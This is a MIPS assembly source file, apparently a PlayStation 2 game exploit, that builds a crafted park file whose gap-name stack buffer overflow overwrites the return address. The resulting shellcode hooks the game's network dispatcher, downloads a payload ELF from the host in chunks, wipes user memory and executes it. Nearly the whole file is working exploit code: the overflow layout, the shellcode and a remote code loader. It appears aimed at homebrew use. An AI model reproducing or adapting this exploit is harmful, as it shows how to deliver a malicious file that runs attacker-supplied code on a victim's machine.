
#
#
#

#.set noat
.set noreorder

# We can't use T0-$t3 because this bullshit assembler will change them to use $t4+. I can't seem to find any command line option or preprocessor
# flag to disable this (fucking GNU bullshit...), so instead we macro the symbolic names to the register numbers. What a time to be alive...
.set T0,                $8
.set T1,                $9
.set T2,                $10
.set T3,                $11

.macro HACK_FUNCTION sym
    .set \sym,      mp_compressed_map_buffer + (_\sym - _buffer_overflow_start) + 0x77B - 0x2B
.endm

.macro HACK_DATA sym
    .set \sym,      mp_compressed_map_buffer + (_\sym - _buffer_overflow_start) + 0x77B - 0x2B
.endm

.macro UNALIGN_WORD sym
    .byte \sym & 0xFF
    .byte (\sym >> 8) & 0xFF
    .byte (\sym >> 16) & 0xFF
    .byte (\sym >> 24) & 0xFF
.endm

# Function and data addresses:
.set mp_compressed_map_buffer,              0x0098f8e0  # Address of CParkManager::mp_compressed_map_buffer buffer in memory, this 
                                                        # is actually +0x2B into the file, hence subtracting 0x2B in HACK_FUNCTION and HACK_DATA

.set printf,                                0x002B24E0
.set malloc,                                0x00112C40

.set Net__Dispatcher__AddHandler,           0x00199AA8
.set Net__Client__EnqueueMessageToServer,   0x0019DD50

.set g_GameNet_Manager_Instance,            0x002EB8F4  # GameNet::Manager::Instance() singleton pointer

.set SifExitRpc,                            0x002A6048

# Function and data addresses in the park file buffer:
HACK_FUNCTION shell_code_start
HACK_FUNCTION Hack_s_handle_payload_data
HACK_FUNCTION Hack_DisplayErrorFatal
HACK_FUNCTION Hack_LoadElfSetup
HACK_FUNCTION Hack_LoadElf

HACK_DATA exploit_message
HACK_DATA receiving_payload_msg
HACK_DATA payload_received_msg
HACK_DATA register_restore_state
HACK_DATA Hack_FailedToAllocateMemory

HACK_DATA Hack_PayloadBuffer
HACK_DATA Hack_PayloadDownloadSize
HACK_DATA Hack_PayloadTotalSize
HACK_DATA Hack_FakeArgsArray
HACK_DATA Hack_FakeArgsString


# Structure of our network payload messages:
#
# struct PayloadData
# {
#       DWORD Id;           // Message ID
#       DWORD Value;        // optional value, can be file size or offset of data depending on the message
# };

# Custom message IDs:
.set MSG_ID_PAYLOAD_REQUEST,        200
.set MSG_ID_PAYLOAD_DATA,           201

.set PAYLOAD_MSG_ID_START,          0   # Value = size of the file
.set PAYLOAD_MSG_ID_DATA,           1   # C->H: Value = offset of data H->C Value = size of data
.set PAYLOAD_MSG_ID_END,            2   # Value = size of data


.set GS_COLOR_RED,                  0x000000FF      # Failed to allocate memory for payload.elf
.set GS_COLOR_BLUE,                 0x0000FF00      # Payload bootstrap started
.set GS_COLOR_GREEN,                0x00FF0000      # Payload copied into memory
.set GS_COLOR_CYAN,                 0x00FFFF00      # User memory cleared
.set GS_COLOR_YELLOW,               0x0000FFFF      # Bootstrap init
.set GS_COLOR_PURPLE,               0x00808080      # Bootstrap init finished

.set Bootstrap_PayloadAddress,      0               # Offset of Hack_PayloadBuffer
.set Bootstrap_ArgsArray,           4               # Offset of arguments for elf launch
.set Bootstrap_CodeOffset,          0x10            # Offset of the bootstrap code


#---------------------------------------------------------
# Gap name buffer overflow
#---------------------------------------------------------
.word   0x77B
.word   (_buffer_overflow_end - _buffer_overflow_start)

_buffer_overflow_start:

        # +0 Start of gap #1 struct.
        .byte 0x10, 0x10
        .byte 0x08, 0x08, 0x14, 0x16
        .byte 0x00, 0x00, 0x13, 0x5F

        # +10 Fill the gap name buffer with crap data.
        #.fill 0xEC, 1, 0x69
        .fill 0x2C, 1, 0x69
        
        # +54 Store the value for var_D0 on the stack, which is the pointer for mp_compressed_map_buffer. In order to break out
        # of the gap processing loop we need to satisfy the loop constraint. So var_D0+0x12 must point to a memory location that
        # contains a half-word value of 1 or 0. Since we only have 32MB of RAM to work with, and we need a 4 byte memory address that
        # won't break the strcpy call early, I chose to use a pointer to the last 16 bytes of RAM which happens to contain 00s.
        UNALIGN_WORD (0x01FFFFF0-0x12)
        
        # +58 Continue the string overflow data until we get to where $ra is stored on the stack.
        .fill 0xBC, 1, 0x69
        
        # +198 Return address to jump to.
        # We have to use .byte because using .word will force a 4-byte alignment and throw off the data.
        UNALIGN_WORD shell_code_start
        UNALIGN_WORD 0x00000000
        .align 2
        
        nop
        nop
        nop
        nop
        nop
        
#---------------------------------------------------------
# Main exploit shellcode
#---------------------------------------------------------

# Exploit entry point
_shell_code_start:

        # Patch the printf function to skip overwriting the putc function pointer.
        la      $s0, printf
        sw      $zero, 0x20($s0)
        sw      $zero, 0x48($s0)

        # Restore the printf putc handler so we can get debug messages over UART.
        la      $s0, 0x002EE540
        la      $a0, 0x002B1CB0
        sw      $a0, 0($s0)
        
        # Invalidate cache so our changes take affect.
        li      $v1, 0x64       # FlushCache
        li      $a0, 0          # Write back data cache
        syscall
        nop
        li      $v1, 0x64       # FlushCache
        li      $a0, 2          # Invalidate instruction cache
        syscall
        nop

        # Print out debug message.
        la      $s0, printf
        la      $a0, exploit_message
        jalr    $s0
        nop
        
        # Get the GameNet::Manager instance.
        lw      $s0, g_GameNet_Manager_Instance         # GameNet::Manager::Instance()
        
        # Get the client instance for player 0.
        lw      $s1, 0x14($s0)                          # pManager->m_client[0]
        
        # Add our message handler for MSG_ID_PAYLOAD_DATA.
        li      T1, 255                                 # HIGHEST_PRIORITY
        move    T0, $s0                                 # Net::Manager*
        li      $a3, 0                                  # flags
        la      $a2, Hack_s_handle_payload_data         # Handler function address
        li      $a1, MSG_ID_PAYLOAD_DATA                # Message ID
        la      $v0, Net__Dispatcher__AddHandler
        jalr    $v0
        addiu   $a0, $s1, 4                             # m_client[0]->m_Dispatcher this ptr
        
        # Send the MSG_ID_PAYLOAD_REQUEST message to the server.
        addiu   $sp, -0x20
        sd      $zero, 0($sp)                           # delay?
                                                        # singular?
        li      T2, 8                                   # vSEQ_GROUP_PLAYER_MSGS
        move    T1, $zero                               # QUEUE_DEFAULT
        li      T0, 0x80                                # NORMAL_PRIORITY
        move    $a3, $zero                              # message data
        move    $a2, $zero                              # size of message data
        li      $a1, MSG_ID_PAYLOAD_REQUEST             # Message ID
        la      $v0, Net__Client__EnqueueMessageToServer
        jalr    $v0
        move    $a0, $s1                                # pManager->m_client[0] (this ptr)
        addiu   $sp, 0x20

        # Restore registers that were trashed from the stack overflow.
        la      $a0, register_restore_state
        ld      $fp, 0($a0)
        ld      $s7, 8($a0)
        ld      $s6, 0x10($a0)
        ld      $s5, 0x18($a0)
        ld      $s4, 0x20($a0)
        ld      $s3, 0x28($a0)
        ld      $s2, 0x30($a0)
        ld      $s1, 0x38($a0)
        ld      $s0, 0x40($a0)
        ld      $ra, 0x48($a0)
        
        # Restore execution back to the game.
        jr      $ra
        nop
        
        #---------------------------------------------------------
        # int __cdecl Hack_s_handle_payload_data(Net::MsgHandlerContext* context) -> Message handler for MSG_ID_PAYLOAD_DATA
        #---------------------------------------------------------
_Hack_s_handle_payload_data:

        .set StackSize,         0x48
        .set extra_var,         -0x48
        .set Msg_Id,            -0x38
        .set Msg_Value,         -0x34
        .set s_s1,              -0x30
        .set s_s0,              -0x20
        .set s_ra,              -0x10
        
        # Setup the stack frame.
        addiu   $sp, -StackSize
        sd      $s1, StackSize+s_s1($sp)
        sd      $s0, StackSize+s_s0($sp)
        sd      $ra, StackSize+s_ra($sp)
        
        move    $s0, $a0    # context (struct PayloadData* pPayloadData)
        
        # Check if the payload buffer has been allocated yet.
        lw      T0, Hack_PayloadBuffer
        bnez    T0, _Hack_s_handle_payload_data_write
        nop
        
            # Print the size of the payload.
            lw      $a1, 4($s0)             # pPayloadData->Value
            la      $a0, receiving_payload_msg
            la      T0, printf
            jalr    T0
            nop
            
            # Allocate a buffer for our payload.
            lw      $a0, 4($s0)             # pPayloadData->Value
            la      T0, malloc
            jalr    T0
            nop
            bnez    $v0, _Hack_s_handle_payload_data_continue
            nop
            
                # Failed to allocate memory for payload.
                lw      $a1, 4($s0)
                la      $a0, Hack_FailedToAllocateMemory
                la      T0, printf
                jalr    T0
                nop
                
                # Set screen color.
                la      $a0, GS_COLOR_RED
                la      T0, Hack_DisplayErrorFatal
                jalr    T0
                nop
            
_Hack_s_handle_payload_data_continue:

            # Save the allocation address and payload data size.
            sw      $v0, Hack_PayloadBuffer             # Hack_PayloadBuffer = malloc(pPayloadData->Value)
            lw      T1, 4($s0)
            sw      T1, Hack_PayloadTotalSize           # Hack_PayloadTotalSize = pPayloadData->Value
            
            # There is no data in the start message, send the reply asking for data.
            b       _Hack_s_handle_payload_data_next
            nop
        
_Hack_s_handle_payload_data_write:

        # Copy the payload data into our local buffer.
        lw      $a0, 4($s0)                     # size = pPayloadData->Value
        addiu   $a1, $s0, 8                     # pSrc = pPayloadData + 8
        lw      $s1, Hack_PayloadBuffer
        lw      T0, Hack_PayloadDownloadSize
        add     $s1, $s1, T0                    # pDst = Hack_PayloadBuffer + Hack_PayloadDownloadSize
        
        move    T1, $zero                       # i = 0
        
0:
        lb      T0, 0($a1)
        sb      T0, 0($s1)                      # *pDst++ = *pSrc++
        addiu   $a1, $a1, 1
        addiu   T1, T1, 1                       # i++
        slt     T0, T1, $a0
        bnez    T0, 0b                          # while (i < size);
        addiu   $s1, $s1, 1
        
        # Update how much data we've downloaded.
        lw      T0, Hack_PayloadDownloadSize
        add     T0, T0, $a0
        sw      T0, Hack_PayloadDownloadSize    # Hack_PayloadDownloadSize += size
        
        # Check if this chunk was the end of the payload buffer.
        lw      $a0, 0($s0)
        li      T0, PAYLOAD_MSG_ID_END
        bne     $a0, T0, _Hack_s_handle_payload_data_next   # if (pPayloadData->Id == PAYLOAD_MSG_ID_END)
        nop
        
            # Print a message indicating the payload has been received.
            la      $a0, payload_received_msg
            la      T0, printf
            jalr    T0
            nop
            
            # Exit RPC services.
            la      T0, SifExitRpc
            jalr    T0
            nop
            
            # Execute the bootstrap to load the payload elf.
            la      T0, Hack_LoadElfSetup
            jalr    T0
            nop
        
_Hack_s_handle_payload_data_next:

        # Setup the reply message to the host.
        li      T0, PAYLOAD_MSG_ID_DATA
        sw      T0, StackSize+Msg_Id($sp)               # ReplyMsg.Id = PAYLOAD_MSG_ID_DATA
        lw      T0, Hack_PayloadDownloadSize
        sw      T0, StackSize+Msg_Value($sp)            # ReplyMsg.Value = Hack_PayloadDownloadSize
        
        # Get the GameNet::Manager instance.
        lw      $s0, g_GameNet_Manager_Instance         # GameNet::Manager::Instance()
        
        # Get the client instance for player 0.
        lw      $s1, 0x14($s0)                          # pManager->m_client[0]
        
        # Send the MSG_ID_PAYLOAD_DATA reply message to the host.
        sd      $zero, StackSize+extra_var($sp)         # delay?
                                                        # singular?
        li      T2, 8                                   # vSEQ_GROUP_PLAYER_MSGS
        move    T1, $zero                               # QUEUE_DEFAULT
        li      T0, 0x80                                # NORMAL_PRIORITY
        addiu   $a3, $sp, StackSize+Msg_Id              # &ReplyMsg
        li      $a2, 8                                  # sizeof(ReplyMsg)
        li      $a1, MSG_ID_PAYLOAD_DATA                # Message ID
        la      $v0, Net__Client__EnqueueMessageToServer
        jalr    $v0
        move    $a0, $s1                                # pManager->m_client[0] (this ptr)
        
        # Destroy stack frame and return.
        li      $v0, 3                                  # return HANDLER_MSG_CONTINUE
        ld      $ra, StackSize+s_ra($sp)
        ld      $s1, StackSize+s_s1($sp)
        ld      $s0, StackSize+s_s0($sp)
        jr      $ra
        addiu   $sp, StackSize
        
    #---------------------------------------------------------
    # void Hack_DisplayErrorFatal(int color) -> Changes the screen color and loops indefinitely
    #---------------------------------------------------------
_Hack_DisplayErrorFatal:

        # Set GS screen color.
        sw      $a0, 0x120000E0
        
_Hack_DisplayErrorFatal_loop:
        b       _Hack_DisplayErrorFatal_loop
        nop
        
    #---------------------------------------------------------
    # void Hack_LoadElfSetup() -> Copies the Hack_LoadElf stub to reserved kernel memory
    #---------------------------------------------------------
_Hack_LoadElfSetup:

        .set StackSize,         0
        .set s_s0,              0
        .set s_ra,              0
        
        # Setup stack frame.
        addiu   $sp, -StackSize
        sd      $ra, StackSize+s_ra($sp)
        sd      $s0, StackSize+s_s0($sp)
        
        # Set screen color.
        la      $a0, GS_COLOR_YELLOW
        sw      $a0, 0x120000E0
        
        # Write the bootstrap header fields.
        la      $s0, 0xFF000
        lw      T0, Hack_PayloadBuffer
        sw      T0, Bootstrap_PayloadAddress($s0)
        addiu   $s1, $s0, (_Hack_FakeArgsString - _Hack_LoadElf + Bootstrap_CodeOffset)
        sw      $s1, Bootstrap_ArgsArray($s0)
        sw      $zero, Bootstrap_ArgsArray+4($s0)
        sw      $zero, Bootstrap_ArgsArray+8($s0)
        
        # Copy bootstrap code into memory.
        addiu   $s1, $s0, Bootstrap_CodeOffset                  # pDst = bootstrap code address
        la      $a1, Hack_LoadElf                               # pSrc = Hack_LoadElf
        li      $a0, (_Hack_LoadElf_copy_end - _Hack_LoadElf)
        move    T1, $zero
        
0:
        lb      T0, 0($a1)
        sb      T0, 0($s1)                      # *pDst++ = *pSrc++
        addiu   $a1, $a1, 1
        addiu   T1, T1, 1                       # i++
        slt     T0, T1, $a0
        bnez    T0, 0b                          # while (i < size);
        addiu   $s1, $s1, 1
        
        # Flush cache.
        li      $v1, 0x64       # FlushCache
        li      $a0, 0          # Flush data cache
        syscall
        nop
        li      $v1, 0x64       # FlushCache
        li      $a0, 2          # Invalidate instruction cache
        syscall
        nop
        
        # Set screen color.
        la      $a0, GS_COLOR_PURPLE
        sw      $a0, 0x120000E0
        
        # Jump to the bootstrap code.
        move    $a3, $zero
        move    $a2, $zero
        move    $a1, $zero
        addiu   $a0, $s0, Bootstrap_CodeOffset                  # bootstrap code address
        li      $v1, 7                  # ExecPS2
        syscall
        nop
    
    #---------------------------------------------------------
    # void Hack_LoadElf() -> Bootstraps the payload elf
    #---------------------------------------------------------
_Hack_LoadElf:

        .set StackSize,         0
        
        # Setup stack frame.
        addiu   $sp, -StackSize
        
        la      $s3, 0xFFFFFFFF                     # lowestSectionAddr = 0xFFFFFFFF
        
        # Set screen color.
        la      $a0, GS_COLOR_BLUE
        sw      $a0, 0x120000E0
        
_shit_loop:
        nop
        #b      _shit_loop
        nop
        
        # Loop through the elf sections and copy them into memory at the correct addresses.
        la      $s0, 0xFF000
        lw      $s0, Bootstrap_PayloadAddress($s0)  # pElfHdr = (elf_header_t*)Hack_PayloadBuffer
        lw      $s1, 0x1C($s0)
        add     $s1, $s1, $s0                       # pProgHeader = (elf_pheader_t*)(Hack_PayloadBuffer + pElfHeader->phoff)
        move    $s2, $zero                          # i = 0
        
_Hack_LoadElf_copy_elf:

        # Check if there's more sections to copy.
        lh      T0, 0x2C($s0)                       # pElfHdr->phnum
        bge     $s2, T0, _Hack_LoadElf_finish       # if (i >= pElfHdr->phnum)
        nop
        
        # Skip any segment that's non-loadable.
        lw      T0, 0($s1)                          # pProgHeader->type
        li      T1, 1
        bne     T0, T1, _Hack_LoadElf_copy_elf_next # if (pProgHeader->type != PT_LOAD)
        
        # Copy the section into memory.
        lw      $v0, 4($s1)                         # pProgHeader->offset
        add     $v0, $v0, $s0                       # pSrc = Hack_PayloadBuffer + pProgHeader->offset
        lw      $v1, 8($s1)                         # pDst = pProgHeader->vaddr
        lw      $a0, 0x10($s1)                      # size = pProgHeader->filesz
        
        move    T1, $zero                           # i = 0
        
        bgt     $v1, $s3, 0f                        # if (pProgHeader->vaddr < lowestSectionAddr)
        
            move    $s3, $v1                        # lowestSectionAddr = pProgHeader->vaddr
        
0:
        lb      T0, 0($v0)
        sb      T0, 0($v1)                          # *pDst++ = *pSrc++
        addiu   $v0, $v0, 1
        addiu   T1, T1, 1                           # i++
        slt     T0, T1, $a0
        bnez    T0, 0b                              # while (i < size);
        addiu   $v1, $v1, 1
        
        # TODO: zero out any remaining data? we clear user mem so probably not needed
        
_Hack_LoadElf_copy_elf_next:

        # Next section.
        addiu   $s2, 1                              # i++
        addiu   $s1, 0x20                           # pProgHeader++
        b       _Hack_LoadElf_copy_elf
        nop
        
_Hack_LoadElf_finish:

        # Set screen color.
        la      $a0, GS_COLOR_CYAN
        sw      $a0, 0x120000E0
        
        # Save the elf entry point address.
        lw      $s0, 0x18($s0)          # pElfHdr->entry

        # Wipe user memory between 0x100000 and the lowest section address. This code is executing from 0xFF000 so we can clear
        # the game memory without destroying our self.
        la      $a0, 0x100000
        move    $a1, $s3
        
_Hack_LoadElf_clear_user_mem:

        sw      $zero, 0($a0)
        addiu   $a0, 4
        slt     T0, $a0, $a1
        bnez    T0, _Hack_LoadElf_clear_user_mem
        nop

        # Flush cache.
        li      $v1, 0x64       # FlushCache
        li      $a0, 0          # Flush data cache
        syscall
        nop
        li      $v1, 0x64       # FlushCache
        li      $a0, 2          # Invalidate instruction cache
        syscall
        nop
        
        # Set screen color.
        la      $a0, GS_COLOR_GREEN
        sw      $a0, 0x120000E0
        
        # Execute the payload.
        la      $a3, 0xFF000
        addiu   $a3, Bootstrap_ArgsArray
        li      $a2, 1
        move    $a1, $zero
        move    $a0, $s0                # entry point
        li      $v1, 7                  # ExecPS2
        syscall
        nop
        
        #-----------------------------------------------------------------------------------------------------
        # Nop sled to force cpu cache to not interpret data as code.
        nop
        nop
        nop
        nop
        nop
        
_Hack_FakeArgsString:
        .asciiz "mass:payload.elf"
        .word 0
        
_Hack_LoadElf_copy_end:

_register_restore_state:
        .quad 0x2f0000      # $fp
        .quad 0x2f0000      # $s7
        .quad 0x00000000    # $s6
        .quad 0x2d0000      # $s5
        .quad 0x98a1a0      # $s4
        .quad 0x00000000    # $s3
        .quad 0x0000002A    # $s2
        .quad 0x00000000    # $s1
        .quad 0x98a1a0      # $s0
        .quad 0x24db5c      # $ra
        
_Hack_PayloadBuffer:
        .word 0x00000000
        
_Hack_PayloadDownloadSize:
        .word 0x00000000
        
_Hack_PayloadTotalSize:
        .word 0x00000000
        
_exploit_message:
        .asciz "HACK THE PLANET\n"
        
_receiving_payload_msg:
        .asciz "Receiving payload %d\n"
        
_payload_received_msg:
        .asciz "Payload received\n"
        
_Hack_FailedToAllocateMemory:
        .asciiz "Failed to allocate %d bytes of memory\n"
        
_Hack_FakeArgsArray:
        .word Hack_FakeArgsString
        .word 0
        
_buffer_overflow_end:

.word 0xFFFFFFFF
